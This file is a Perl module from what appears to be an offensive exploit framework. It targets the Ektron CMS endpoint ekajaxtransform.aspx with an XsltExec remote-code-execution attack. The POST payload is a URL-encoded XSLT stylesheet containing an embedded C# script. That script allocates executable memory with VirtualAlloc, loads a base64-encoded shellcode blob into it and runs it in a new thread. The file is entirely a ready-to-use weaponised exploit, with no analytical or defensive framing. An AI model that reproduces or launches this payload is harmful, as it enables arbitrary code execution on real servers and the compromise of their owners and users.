package MSFPerlExploits::EKTRON::MSF::XsltExec;
use parent qw(P1rK3r::Exploit P1rK3r::Services::EKTRON);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "XsltExec";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'XsltExec',
        TYPE => 'MSF',
        PLATFORM => 'WINDOWS',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'WorkArea/ContentDesigner/ekajaxtransform.aspx',
                        PAYLOAD      => 'xml=ppDHFqJ&xslt=%3c%3fxml%20version%3d%271.0%27%3f%3e%0a%3cxsl%3astylesheet%20version%3d%221.0%22%0axmlns%3axsl%3d%22http%3a//www.w3.org/1999/XSL/Transform%22%0axmlns%3amsxsl%3d%22urn%3aschemas-microsoft-com%3axslt%22%0axmlns%3auser%3d%22http%3a//mycompany.com/mynamespace%22%3e%0a%3cmsxsl%3ascript%20language%3d%22C%23%22%20implements-prefix%3d%22user%22%3e%0a%3c%21%5bCDATA%5b%0a%0aprivate%20static%20UInt32%20MEM_COMMIT%20%3d%200x1000%3b%0aprivate%20static%20UInt32%20PAGE_EXECUTE_READWRITE%20%3d%200x40%3b%0a%0a%5bSystem.Runtime.InteropServices.DllImport%28%22kernel32%22%29%5d%0aprivate%20static%20extern%20UInt32%20VirtualAlloc%28UInt32%20lpStartAddr%2c%20UInt32%20size%2c%20UInt32%20flAllocationType%2c%20UInt32%20flProtect%29%3b%0a%0a%5bSystem.Runtime.InteropServices.DllImport%28%22kernel32%22%29%5d%0aprivate%20static%20extern%20IntPtr%20CreateThread%28UInt32%20lpThreadAttributes%2c%20UInt32%20dwStackSize%2c%20UInt32%20lpStartAddress%2c%20IntPtr%20param%2c%20UInt32%20dwCreationFlags%2c%20ref%20UInt32%20lpThreadId%29%3b%0a%0apublic%20string%20xml%28%29%0a%7b%0a%20%20string%20shellcode64%20%3d%20%40%22R0H5QUD4R0eZL0k3/PxHlvzWmJ/9mfXWlvj4SUL1m9aZJ0%2bZS/mZSUY3RtZOTvhIkEeYn0pGkdb5mEGTQZmXl0KYky%2bYTk%2bSQkHWN5L1S/VI/SdHQJJIL5KSSplHn06YN0cvQEaZQJlOmEuQQC%2bXSkbWRkBG/Esvl5lOJ/g3SC83kZabT0FI%2bZFC/P1BN05KN04/SphC%2bSdKQi/1mJH9kkFGTp%2bSn5hLlkhJ/JYnSk43L5ubSZFPL/j9k05GRpdCT5b5QZFDkdaRn5FL%2bJlI9fX8k5iRQDf19fhCSJhBSEc3L5ZAS5D8lv1OmzdOSP31Tkgv%2bEdPS/lHL5CZn0svQkkvSJtAN5mTNy83lkZDQUYnkEYvlk%2bRkfVGP0tOSkCS1kdPQ/1AJ/n8Q0/5kkE/T5j4%2bUlI1kefQU%2bbQNYnSJP5S0eXN5GRQvk3/SdKQ5CfSpE3kZD4/Es/k5P4%2bZeRNzfWS0aQT/lDkkJLS/xBRk6Z%2bDf4m0OSSZeWl9aW%2bU6ZJ5f5kU8/kJNBQfyXP5D1m0CRQ/gvRv34T5BBm0dBQpeRl5mRR0mW%2bEZJQSc/T5KfQ5E/mPlDkpb5T/1O%2bf1CTkuXkPVKl/VDSk%2bfS/k3N0P5Ti%2bfPyeTmE6Rn0NHmz%2bQ/UZISZKYlktKP0f4kJZKR0BGQ5gvPzeQk05KP5bWQ/iQ/UmSL0eQmDeY1i/4kpc3lp8vQE6SQEOXSi9Cm0MvL0DWmUpLSflAki9HQy9GmUdBkkaYRktLl0b5kUhB%2bT9GQ0f4kZsnQT/8T/z1l5YnQ/1BmJifm5b1/JuR9ZjWkSdJ%2bEL19ZKRSZ9KQ5dLQ5CXTz9KTpJOk0OXkfVKN06Xn/VK/JuZSJKSSUD8mC9CkvWWS0DWkZtGS0dAQ0ZOL5CXl0qYSkL1mC9K/EFIS5D1%2bE6XQJs3S5tBn5BGQ0aYTj9HJz9Ikfz8N/hJQUdCm/0vSJI/k0r8kv2Ylvj4SD%2bX%2bNaYS5H5R5tJ%2bUNOk58/T5j9J59Ikko3/UCbR/ySmPyYmzdHSieYSkBHSi/4/PiSn078%2bEOR1kdJkpg3l5OZl0A3/EovSEL8R/WW%2bJhDQPhARk9CP0Y/1j%2bQSkJOSpCYN/z5kpb9NyefR/03RpKWQpH4kZBLP5H1/EJIlkD4TpNL9ZubQZKbk0NHkpmXTviS9fhIl0pIJ5tHSpg/SD/9m05KJ0FKn0NOl04/lvlBT59OmEOYS/ybmJGY%2bUtOm0hLmUn5Skv4SUFBS5dCP0OWSJdHQUtOPy9I1kCSkDdDkPw/Q0%2bWSZaW/UFJT0ZL/PlIRkGb/D9A%2bfk/Q5Y/L0hCkDdGS0qRJ5j4P5c3/SdGQPibS/WZR0/8kJvWk/Uv9UtJN0tC1kjWP/hJ/f35n5L1P5f1n/n4mDdBN5hKmPWZkf1Lk0kvSElKSk%2bYSyfWQUJCSPz8kfz5mUIvTkP4mfwn/UI/9UeSk0dDQJcnQpZDmPX8QfxG/db1Sf34kdb4mUo/SUlKJ/jW9Sf8kZNP1k/WmUhAQ5Cb/Pn4TpaQ/PlPS0aQQU78n9b51puTQ5OTkEdGkZiR%2bZeYQJL4J5dO%2bEdCkkJDl/kn9ZuX1i9G1k75/UpGmPWfP0%2bf/ZhGkyf5%2bS%2bW%2bEfW/PVON5JH1j/9kUdJSEBK%2bUFAk0v8SSf8kpg/kfjWSpmWR06Zl5tCR5I31vlKn/wvk5%2bTTk6QL0aXTpmZk5s3SC%2bWSplB%2bENGSpBBL5L8T5mbR0LWR/jWSk5Ok5c3P0r1kUH5S/2WRidA9UGR1pmRkUqRlps/%2bEpJk58//Ur4/Sf1T5ZBRi%2bfNzcnn05GSEZAn0CbS5BBQEqWTptPmzcv%2bCfWkpf9Svz5kT%2bYT/lIk0g//En19ZaWT/VGn0ab%2bUNHTy9JS/k/SEqYS0H8kUqTRkKZkJn9QEBOQzeZmZiTkU9OJ0f4S0D9SEtLTptITvlASpiQ1p/19ZKYN5aYT9b89Zs/mE9HTidImDdIn0dAP/X4SZBDN5CXmC%2bbSEGYQPiT%2bJhDm0mbRz8n%2bJP5kPWTli8//ZmTm/1JkUuXT0P4l0OYJ5b8R5OfmZCRS0n5kviXJ0P9l0mQS09O/JuZQ083R05KRpdO9UFPkUiWTkeQQ5ZIR0KTm/iWk/yfTp8nL5GRQkqWmEORRk5DTkKYkU6Yl/lCN0k3Skc3%2bEuSTkqWmEpAQ0tG/fn51pmYmT%2bZJz/WkUdKT078T9aQk/mX/JGWSZdGT0tKkzeSm075SZZC9Uj8/ZI3Sfj8QU9Ol5ZHNz9ImUdOR/VJRzcn9UaXQktGmZBBR0CZRkqX/PX5Skb8SEeTn0FG9ZaYn5nWSUr1T0KWkJtP1v1K/ZiRQD9CP5NOkk9C1jf4L5KSmTdDSk/1J5In1pFDkZH1SUL8m5FD/EBP/ZdGQJKbljdP%2bUdCQ0tDQ0abRpJI9S%2bSSUv5kpP5n0P4S/j1QZFPkDf8/dZIl5KR9UP9Rtb51pOQ%2bZNLk/n5Rj%2bWN5aRl09DkTfW9ZFGm5aYQEKTS5hKlptKmZvWS0KTL5k3l5j5l0aXQfj9QkpGSJYnJ59K1kiQSpg/N5EnSJYvl9ZOkvw/m5JLQZGZlvmb1kk/9S/9QjeTS0Y3mf0/Qk78SpY3/JubT5D4J0n1R0mXPy/8%2bZBCkEeY/ZiW%2bU4vQ/38QSeb1pFC1kORmJj5kEefl5KTR5iRN0n91kD4/Jg/L5f1%2bZ%2bfl/VCkTf4gcRU8v//X19QQVlMT0FEX18%3d%22%3b%0a%20%20byte%5b%5d%20shellcode%20%3d%20System.Convert.FromBase64String%28shellcode64%29%3b%0a%20%20UInt32%20funcAddr%20%3d%20VirtualAlloc%280%2c%20%28UInt32%29shellcode.Length%2c%20MEM_COMMIT%2c%20PAGE_EXECUTE_READWRITE%29%3b%0a%20%20System.Runtime.InteropServices.Marshal.Copy%28shellcode%20%2c%200%2c%20%28IntPtr%29%28funcAddr%29%2c%20shellcode%20.Length%29%3b%0a%20%20IntPtr%20hThread%20%3d%20IntPtr.Zero%3b%0a%20%20IntPtr%20pinfo%20%3d%20IntPtr.Zero%3b%0a%20%20UInt32%20threadId%20%3d%200%3b%0a%20%20hThread%20%3d%20CreateThread%280%2c%200%2c%20funcAddr%2c%20pinfo%2c%200%2c%20ref%20threadId%29%3b%0a%20%20return%20%22NwJuBAzfz%22%3b%0a%7d%0a%5d%5d%3e%0a%3c/msxsl%3ascript%3e%0a%3cxsl%3atemplate%20match%3d%22/%22%3e%0a%3cxsl%3avalue-of%20select%3d%22user%3axml%28%29%22/%3e%0a%3c/xsl%3atemplate%3e%0a%3c/xsl%3astylesheet%3e%0a',
                        TEXT         => 'Sending First Exploit Request On : /WorkArea/ContentDesigner/ekajaxtransform.aspx',
                        HEADERS      => {
                           'Referer' => 'http://127.0.0.1:80/3v1l/WINDOWS/EKTRON/XsltExec/',
                           'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;